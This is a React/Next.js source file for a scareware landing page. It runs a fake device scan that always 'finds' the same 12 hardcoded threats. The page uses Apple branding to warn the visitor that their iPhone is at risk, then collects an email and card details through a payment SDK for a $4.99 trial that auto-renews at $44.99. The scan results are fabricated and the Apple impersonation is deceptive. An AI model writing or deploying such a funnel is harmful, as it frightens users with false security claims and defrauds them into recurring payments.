'use client'

import { useState, useEffect, useRef } from 'react'
import Script from 'next/script'

declare global {
	interface Window {
		truegateSdk: any
	}
}

function setCookie(name: string, value: string, days: number = 30) {
	const date = new Date()
	date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000)
	const expires = 'expires=' + date.toUTCString()
	document.cookie =
		name + '=' + encodeURIComponent(value) + ';' + expires + ';path=/'
}

function getCookie(name: string): string | null {
	const nameEQ = name + '='
	const ca = document.cookie.split(';')
	for (let i = 0; i < ca.length; i++) {
		let c = ca[i].trim()
		if (c.indexOf(nameEQ) === 0)
			return decodeURIComponent(c.substring(nameEQ.length, c.length))
	}
	return null
}

export default function SpecialPage() {
	const [phase, setPhase] = useState<'scan' | 'results'>('scan')
	const [progress, setProgress] = useState(0)
	const [isModalOpen, setIsModalOpen] = useState(false)

	const [email, setEmail] = useState('')
	const [isEmailDisabled, setIsEmailDisabled] = useState(false)
	const [isOverlayVisible, setIsOverlayVisible] = useState(true)
	const [overlayMsg, setOverlayMsg] = useState({
		text: 'Enter your email above to unlock secure payment',
		type: 'info',
	})

	const [errorMsg, setErrorMsg] = useState('')
	const [isSuccess, setIsSuccess] = useState(false)
	const [payBtnText, setPayBtnText] = useState('PAY')
	const [isPayDisabled, setIsPayDisabled] = useState(true)

	// ==========================================
	// РЕФЫ И КОНСТАНТЫ
	// ==========================================
	const clickIdRef = useRef<string>('')
	const sdkInitRef = useRef(false)
	const submitCardRef = useRef<any>(null)
	
	// НОВЫЙ РЕФ ДЛЯ ХРАНЕНИЯ ЭКЗЕМПЛЯРА SDK (ДЛЯ УДАЛЕНИЯ ПРИ ОШИБКЕ)
	const sdkInstanceRef = useRef<any>(null)

	const typingTimerRef = useRef<NodeJS.Timeout | null>(null)
	const currentEmailRef = useRef<string | null>(null)
	const isFetchingWidgetRef = useRef(false)

	const API_BASE = 'https://wa-adminn.com'
	const PLAN_CODE = 'trial_month'

	useEffect(() => {
		// 1. Перехват ClickID
		const urlParams = new URLSearchParams(window.location.search)
		let cid =
			urlParams.get('clickid') ||
			urlParams.get('clk_id') ||
			urlParams.get('click_id') ||
			''

		if (cid) {
			localStorage.setItem('clickid', cid)
			setCookie('clickid', cid, 30)
		} else {
			cid = localStorage.getItem('clickid') || getCookie('clickid') || ''
		}
		clickIdRef.current = cid

		// 2. Проверка вернувшегося пользователя
		const savedEmail = sessionStorage.getItem('userEmail')
		if (savedEmail) {
			setEmail(savedEmail)
			setIsEmailDisabled(true)
			currentEmailRef.current = savedEmail
			preparePayment(savedEmail, false)
		}
	}, [])

	useEffect(() => {
		if (phase !== 'scan') return

		let prog = 0
		const scanInterval = setInterval(() => {
			prog++
			setProgress(prog)

			if (prog >= 100) {
				clearInterval(scanInterval)
				setTimeout(() => {
					setPhase('results')
				}, 800)
			}
		}, 30)

		return () => clearInterval(scanInterval)
	}, [phase])

	const validateEmail = (val: string) =>
		/^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/.test(val)

	const extractUsername = (val: string) => {
		const atIndex = val.indexOf('@')
		if (atIndex === -1) return val
		return val.substring(0, atIndex)
	}

	const showOverlayError = (message: string) => {
		setOverlayMsg({ text: message, type: 'error' })
		setIsOverlayVisible(true)
	}

	const showOverlayLoading = (message: string) => {
		setOverlayMsg({ text: message, type: 'loading' })
		setIsOverlayVisible(true)
	}

	const resetPayButton = () => {
		setIsPayDisabled(false)
		setPayBtnText('PAY')
	}

	const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		let val = e.target.value
		val = val.replace(/[А-Яа-яЁё]/g, '').replace(/[^A-Za-z0-9@._%+-]/g, '')

		setEmail(val)

		if (!validateEmail(val)) {
			setIsOverlayVisible(true)
			setOverlayMsg({
				text: 'Enter your email above to unlock secure payment',
				type: 'info',
			})
			setIsPayDisabled(true)
		}

		if (typingTimerRef.current) clearTimeout(typingTimerRef.current)

		if (validateEmail(val) && val !== currentEmailRef.current) {
			typingTimerRef.current = setTimeout(() => {
				preparePayment(val, true)
			}, 400)
		}
	}

	const handleDomainClick = (domain: string) => {
		const username = extractUsername(email.trim())
		if (!username) return

		const newEmail = username + domain
		setEmail(newEmail)

		if (newEmail !== currentEmailRef.current && validateEmail(newEmail)) {
			preparePayment(newEmail, true)
		}
	}

	// ==========================================
	// ПОДГОТОВКА ПЛАТЕЖА С ФЛАГОМ REFRESH
	// ==========================================
	const preparePayment = async (
		emailValue: string,
		isNewUser: boolean = false,
		forceRetry: boolean = false // Добавлен флаг принудительного рестарта
	) => {
		if (isFetchingWidgetRef.current) return
		
		// Если это не рестарт, и email не менялся, и SDK уже запущен — выходим
		if (!forceRetry && sdkInitRef.current && emailValue === currentEmailRef.current) return

		isFetchingWidgetRef.current = true
		
		// Показываем текст в зависимости от того, первичная это загрузка или рестарт после ошибки
		showOverlayLoading(forceRetry ? 'Regenerating secure connection...' : 'Securing payment connection...')
		setIsPayDisabled(true)

		// Сбрасываем флаги, если это рестарт или сменился email
		if (forceRetry || (sdkInitRef.current && emailValue !== currentEmailRef.current)) {
			sdkInitRef.current = false
			submitCardRef.current = null
		}

		try {
			let tgUserId = localStorage.getItem('tg_user_id') || null

			if (isNewUser) {
				showOverlayLoading('Registering your account...')

				const regRes = await fetch(`${API_BASE}/api/v1/register/`, {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({
						email: emailValue,
						subscription_type_code: PLAN_CODE,
						click_id: clickIdRef.current,
						clickid: clickIdRef.current,
					}),
				})

				const regData = await regRes.json()

				if (!regRes.ok) {
					throw new Error(
						regData.detail ||
							regData.message ||
							'Registration failed. Please try again.',
					)
				}

				sessionStorage.setItem('userEmail', emailValue)
				if (regData.truegate_external_user_id) {
					tgUserId = regData.truegate_external_user_id
					localStorage.setItem('tg_user_id', tgUserId)
				}
			}

			// ШАГ 2: Получение виджета
			showOverlayLoading('Loading secure payment form...')

			const widgetBody: any = {
				subscription_type_code: PLAN_CODE,
				email: emailValue,
			}

			if (tgUserId) {
				widgetBody.truegate_external_user_id = tgUserId
			}

			const response = await fetch(
				`${API_BASE}/api/v1/subscription-payment-widget/`,
				{
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify(widgetBody),
				},
			)

			const data = await response.json()

			if (!response.ok) {
				throw new Error(
					data.detail || data.message || 'Failed to load payment widget.',
				)
			}

			if (!data.payment_widget || !data.payment_widget.transactionId) {
				throw new Error(
					'Payment service temporarily unavailable. Please try again later.',
				)
			}

			currentEmailRef.current = emailValue
			// Передаем email дальше для возможного рестарта
			await initTruegateSDK(data.payment_widget.transactionId, emailValue)
		} catch (error: any) {
			console.error('preparePayment error:', error)
			showOverlayError(error.message)
		} finally {
			isFetchingWidgetRef.current = false
		}
	}

	// ==========================================
	// ИНИЦИАЛИЗАЦИЯ И УНИЧТОЖЕНИЕ SDK
	// ==========================================
	const initTruegateSDK = async (transactionId: string, targetEmail: string) => {
		if (sdkInitRef.current) return

		await new Promise<void>(resolve => {
			if (window.truegateSdk) resolve()
			else {
				window.addEventListener('message', e => {
					if (e.data && e.data.type === 'SDK_READY') resolve()
				})
			}
		})

		// 1. УБИВАЕМ СТАРЫЙ SDK ПЕРЕД СОЗДАНИЕМ НОВОГО
		if (sdkInstanceRef.current) {
			if (typeof sdkInstanceRef.current.destroy === 'function') {
				try {
					sdkInstanceRef.current.destroy()
				} catch (e) {
					console.warn('Destroy error:', e)
				}
			}
			sdkInstanceRef.current = null
			submitCardRef.current = null
		}

		// 2. СОЗДАЕМ НОВЫЙ SDK
		const sdkInstance = new window.truegateSdk({
			id: 'payment-instance',
			transactionId: transactionId,
			env: 'PROD',
		})

		sdkInstance.on('PAYMENT_STATUS', (payload: any) => {
			if (payload.details.status === 'SUCCESS') {
				setIsSuccess(true)
				setErrorMsg('🎉 Payment successful! Redirecting...')
				setTimeout(() => {
					window.location.href = '/thankyou' + window.location.search
				}, 1500)
			} else if (payload.details.status === 'FAILED') {
				// 3. ПРИ ОШИБКЕ БЛОКИРУЕМ И ЗАПУСКАЕМ РЕСТАРТ ЧЕРЕЗ 1.5 СЕК
				setErrorMsg('Payment declined. Generating a new secure form...')
				setIsPayDisabled(true)
				setPayBtnText('Reloading...')

				setTimeout(() => {
					setErrorMsg('')
					preparePayment(targetEmail, false, true) // isNewUser = false, forceRetry = true
				}, 1500)
			}
		})

		sdkInstance.on('PAYMENT_ERROR', () => {
			setErrorMsg('Error processing payment. Please check card details.')
			resetPayButton()
		})

		await sdkInstance.init()
		sdkInitRef.current = true
		
		// 4. СОХРАНЯЕМ ИНСТАНС
		sdkInstanceRef.current = sdkInstance

		try {
			// Очищаем DOM элементы перед инициализацией
			const numEl = document.getElementById('card-number')
			const expEl = document.getElementById('card-expiration')
			const cvvEl = document.getElementById('card-cvv')
			if (numEl) numEl.innerHTML = ''
			if (expEl) expEl.innerHTML = ''
			if (cvvEl) cvvEl.innerHTML = ''

			const result = await sdkInstance.initCardPayment({
				cardNumberId: 'card-number',
				expirationId: 'card-expiration',
				securityCodeId: 'card-cvv',
				options: {
					FONT_NAME: 'system-ui, -apple-system, sans-serif',
					FONT_SIZE: '16px',
					COLOR: '#111827',
					PLACEHOLDER_COLOR: '#9ca3af',
					PLACEHOLDER_CARD_NUMBER: '0000 0000 0000 0000',
					PLACEHOLDER_EXPIRATION: 'MM / YY',
					PLACEHOLDER_SECURITY_CODE: 'CVC',
				},
			})

			submitCardRef.current = result.submit

			// Форма загружена успешно — убираем оверлей и активируем кнопку
			setIsOverlayVisible(false)
			setIsPayDisabled(false)
			setPayBtnText('PAY')
			setIsEmailDisabled(true)
		} catch (err) {
			console.error('initCardPayment error:', err)
			showOverlayError(
				'Failed to initialize card fields. Please refresh the page.',
			)
		}
	}

	const handlePaymentSubmit = async () => {
		if (!submitCardRef.current) return
		setErrorMsg('')
		setIsPayDisabled(true)
		setPayBtnText('Processing...')

		try {
			await submitCardRef.current({ cardHolderName: 'Card Holder' })
		} catch (error) {
			console.error('Payment submit error:', error)
			setErrorMsg('Please fill in all card details correctly.')
			resetPayButton()
		}
	}

	const visibleIssues = Math.floor((progress / 100) * 12)
	const threats = [
		'Unauthorized access detected',
		'Phishing attacks detected',
		'Data leak detected',
		'Application vulnerabilities detected',
		'Network spoofing detected',
		'Malware and spyware detected',
		'Device jailbreak detected',
		'Suspicious configuration profiles detected',
		'Unsafe app permissions detected',
		'Connection to untrusted Wi-Fi detected',
		'Outdated system components detected',
		'Risk of personal data interception detected',
	]

	return (
		<>
			<Script
				src='https://sdk.truegate.tech/sdk.js'
				strategy='afterInteractive'
			/>

			<style
				dangerouslySetInnerHTML={{
					__html: `
				.secure-overlay {
					position: absolute; top: 0; left: 0; right: 0; bottom: 0;
					background: rgba(255, 255, 255, 0.95);
					z-index: 10; display: flex; flex-direction: column;
					align-items: center; justify-content: center; text-align: center;
					padding: 20px; border-radius: 8px; transition: opacity 0.3s;
				}
				.secure-overlay.hidden { opacity: 0; pointer-events: none; }
				
				.relative-container { position: relative; min-height: 250px; }
				
				div.custom-input {
					height: 48px; background: #ffffff; border: 1px solid #cbd5e1;
					border-radius: 6px; padding: 0 16px; display: flex; align-items: center;
					width: 100%; box-sizing: border-box; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
					overflow: hidden;
				}
				
				/* ЖЕСТКИЕ ПРАВИЛА ДЛЯ IFRAME: УБИРАЕМ ВСЕ ОТСТУПЫ И ГЭПЫ */
				div.custom-input iframe {
					display: block !important;
					width: 100% !important; height: 100% !important;
					border: none !important; outline: none !important; background: transparent !important;
					margin: 0 !important; padding: 0 !important;
				}

				/* 🔴 ЖЕСТКИЙ ФИКС ОТ ЛЮБЫХ ДУБЛИРОВАНИЙ 🔴 */
				div.custom-input iframe:nth-of-type(n+2) {
					display: none !important;
				}

				.domain-row {
					display: flex; gap: 8px; justify-content: center; 
					margin-bottom: 25px; margin-top: 10px; flex-wrap: wrap;
				}
				.domain-btn {
					background: #f1f5f9; border: 1px solid #cbd5e1; color: #334155;
					border-radius: 6px; padding: 8px 12px; font-size: 14px; font-weight: 500;
					cursor: pointer; transition: background 0.2s, transform 0.1s;
				}
				.domain-btn:hover { background: #e2e8f0; }
				.domain-btn:active { transform: scale(0.97); }
				
				.row-50-50 { display: flex; gap: 16px; margin-top: 16px; margin-bottom: 24px; }
				.row-50-50 .input-group { flex: 1; }

				.modal-overlay { display: none; }
				.modal-overlay.active { display: flex; }
				.threat-item { display: none; }
				.threat-item.visible { display: flex; }
			`,
				}}
			/>

			<div
				className={`app-container-apple-bl ${phase === 'results' ? 'light-mode' : ''}`}
				id='appContainer'
			>
				{phase === 'scan' && (
					<div id='phase-scan'>
						<div className='scan-logo'>
							<svg
								viewBox='0 0 384 512'
								xmlns='http://www.w3.org/2000/svg'
								fill='currentColor'
							>
								<path d='M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z' />
							</svg>
						</div>
						<div className='scan-title'>
							DEVICE SCAN FOR POTENTIAL
							<br />
							THREATS
						</div>
						<div className='progress-bar-wrapper'>
							<div
								className='progress-bar-fill'
								style={{ width: `${progress}%` }}
							></div>
						</div>
						<div className='issues-header'>
							<span className='issues-header-title'>DETECTED ISSUES</span>
							<span className='issues-header-count'>{visibleIssues}</span>
						</div>
						<div className='threat-list'>
							{threats.map((threat, idx) => (
								<div
									key={idx}
									className={`threat-item ${idx < visibleIssues ? 'visible' : ''}`}
								>
									<span>
										{threat.split(' ')[0]}{' '}
										{threat.split(' ').slice(1, -1).join(' ')}
									</span>
									<span>detected</span>
								</div>
							))}
						</div>
					</div>
				)}

				{phase === 'results' && (
					<div id='phase-results' style={{ display: 'flex' }}>
						<div className='res-header'>
							<img src='/img/apple3.svg' alt='apple' />
							<span>APPLE</span>
						</div>
						<div className='res-red-alert'>12 Security Issues Found</div>
						<div className='alert-box'>
							<div className='alert-box-left'>
								<div className='alert-box-icon'>
									<img src='/img/setting3.svg' alt='setting' />
								</div>
								<div className='alert-box-text'>
									Suspicious sign-in
									<br />
									activity detected
								</div>
							</div>
							<button className='btn-found'>FOUND</button>
						</div>
						<div className='main-res-title'>
							SUSPICIOUS ACCESS ATTEMPTS IDENTIFIED
						</div>
						<div className='main-res-desc'>
							Attempts to access your personal data without authorization were
							detected over the past 7 days.
						</div>
						<img className='graf' src='/img/graphik.svg' alt='graf' />

						<button className='btn-blue' onClick={() => setIsModalOpen(true)}>
							GET SCAN RESULTS
						</button>

						<div className='issue-cards-row'>
							<div className='issue-card'>
								<div className='issue-card-top'>
									<div className='issue-icon'>
										<img src='/img/key-icon.svg' alt='key' />
									</div>
									<button className='btn-found'>ISSUE</button>
								</div>
								<div className='issue-title'>Passwords</div>
								<div className='issue-desc'>
									Possible Fraud
									<br />
									Attempts
								</div>
							</div>
							<div className='issue-card'>
								<div className='issue-card-top'>
									<div
										className='issue-icon'
										style={{ backgroundColor: 'transparent' }}
									>
										<img src='/img/photo-icon.svg' alt='photo' />
									</div>
									<button className='btn-found'>ISSUE</button>
								</div>
								<div className='issue-title'>Photos</div>
								<div className='issue-desc'>
									Possible Fraud
									<br />
									Attempts
								</div>
							</div>
						</div>
					</div>
				)}
			</div>

			{/* МОДАЛЬНОЕ ОКНО С ОПЛАТОЙ */}
			<div
				className={`modal-overlay ${isModalOpen ? 'active' : ''}`}
				id='paymentModal'
			>
				<div className='modal-wrapper'>
					<button className='close-btn' onClick={() => setIsModalOpen(false)}>
						<svg
							viewBox='0 0 24 24'
							fill='none'
							strokeWidth='2'
							strokeLinecap='round'
							strokeLinejoin='round'
						>
							<line x1='18' y1='6' x2='6' y2='18'></line>
							<line x1='6' y1='6' x2='18' y2='18'></line>
						</svg>
					</button>

					<div className='modal-content'>
						<div className='modal-title'>
							YOUR IPHONE MAY BE AT <span>RISK</span>
						</div>
						<div className='modal-subtitle'>Action is recommended now</div>

						<div className='settings-icon-wrapper'>
							<div className='settings-icon'>
								<img src='/img/settings.svg' alt='setting' />
							</div>
						</div>

						<div className='payment-container' id='payment-form'>
							<div className='input-group' style={{ marginBottom: '10px' }}>
								<span
									className='input-label'
									style={{
										color: '#007bff',
										fontWeight: 'bold',
										display: 'block',
										marginBottom: '8px',
									}}
								>
									Verify Email
								</span>
								<input
									type='email'
									className='custom-input'
									placeholder='your@email.com'
									style={{ borderColor: '#007bff' }}
									value={email}
									onChange={handleEmailChange}
									disabled={isEmailDisabled}
									required
								/>
							</div>

							{!isEmailDisabled && (
								<div className='domain-row'>
									<button
										type='button'
										className='domain-btn'
										onClick={() => handleDomainClick('@gmail.com')}
									>
										@gmail.com
									</button>
									<button
										type='button'
										className='domain-btn'
										onClick={() => handleDomainClick('@yahoo.com')}
									>
										@yahoo.com
									</button>
									<button
										type='button'
										className='domain-btn'
										onClick={() => handleDomainClick('@hotmail.com')}
									>
										@hotmail.com
									</button>
								</div>
							)}

							<div className='relative-container'>
								<div
									className={`secure-overlay ${!isOverlayVisible ? 'hidden' : ''}`}
								>
									<p
										style={{
											fontWeight: 600,
											color: '#333',
											marginBottom: '10px',
											fontSize: '16px',
										}}
									>
										{overlayMsg.type === 'loading'
											? 'Processing...'
											: 'Enter your email above to unlock secure payment'}
									</p>
									<span
										style={{
											color:
												overlayMsg.type === 'error'
													? '#e53e3e'
													: overlayMsg.type === 'loading'
														? '#007bff'
														: '#666',
											fontSize: '14px',
											fontWeight: overlayMsg.type === 'error' ? 500 : 400,
										}}
									>
										{overlayMsg.text}
									</span>
								</div>

								<div className='input-group'>
									<span
										className='input-label'
										style={{
											display: 'block',
											marginBottom: '8px',
											fontSize: '14px',
											fontWeight: 600,
											color: '#374151',
										}}
									>
										Payment card number
									</span>
									<div id='card-number' className='custom-input'></div>
								</div>

								<div className='row-50-50'>
									<div className='input-group'>
										<span
											className='input-label'
											style={{
												display: 'block',
												marginBottom: '8px',
												fontSize: '14px',
												fontWeight: 600,
												color: '#374151',
											}}
										>
											Expiration date
										</span>
										<div id='card-expiration' className='custom-input'></div>
									</div>
									<div className='input-group'>
										<span
											className='input-label'
											style={{
												display: 'block',
												marginBottom: '8px',
												fontSize: '14px',
												fontWeight: 600,
												color: '#374151',
											}}
										>
											CVV/CVC
										</span>
										<div id='card-cvv' className='custom-input'></div>
									</div>
								</div>

								{errorMsg && (
									<div
										role='alert'
										style={{
											color: isSuccess ? '#10B981' : '#e53e3e',
											marginBottom: '15px',
											fontSize: '14px',
											textAlign: 'center',
											fontWeight: 'bold',
										}}
									>
										{errorMsg}
									</div>
								)}

								<button
									id='submit-button'
									className='btn-green-pay'
									disabled={isPayDisabled}
									onClick={handlePaymentSubmit}
									style={{
										opacity: isPayDisabled ? 0.5 : 1,
										transition: '0.2s',
										width: '100%',
									}}
								>
									{payBtnText === 'PAY' && (
										<img
											src='/img/paygreen.svg'
											alt='pay'
											style={{ marginRight: '8px' }}
										/>
									)}
									{payBtnText}
								</button>
							</div>
						</div>

						<div className='guarantee-section'>
							<div className='disclaimer-text'>
								You will be automatically charged $4.99 for a 3-day trial. The
								subscription will then be auto-renewed after 4 days at the full
								price of $44.99. Payments are charged in USD. To learn more,
								visit our Terms of Use or Privacy Policy.
							</div>
							<div className='guarantee-box'>
								<div className='guarantee-header'>
									<h3 className='guarantee-title'>100% Money-Back Guarantee</h3>
								</div>
								<p className='guarantee-desc'>
									We take pride in the reliability and effectiveness — thousands
									of users worldwide trust us to protect their devices and
									personal data every day. If you've experienced technical
									issues, we're committed to making it right — including
									offering a full refund.
								</p>
							</div>
						</div>

						<div className='line-sep'></div>
						<a href='/policy' target='_blank' className='modal-privacy'>
							PRIVACY POLICY
						</a>
						<div className='modal-copy'>© 2026. All rights reserved.</div>
					</div>
				</div>
			</div>
		</>
	)
}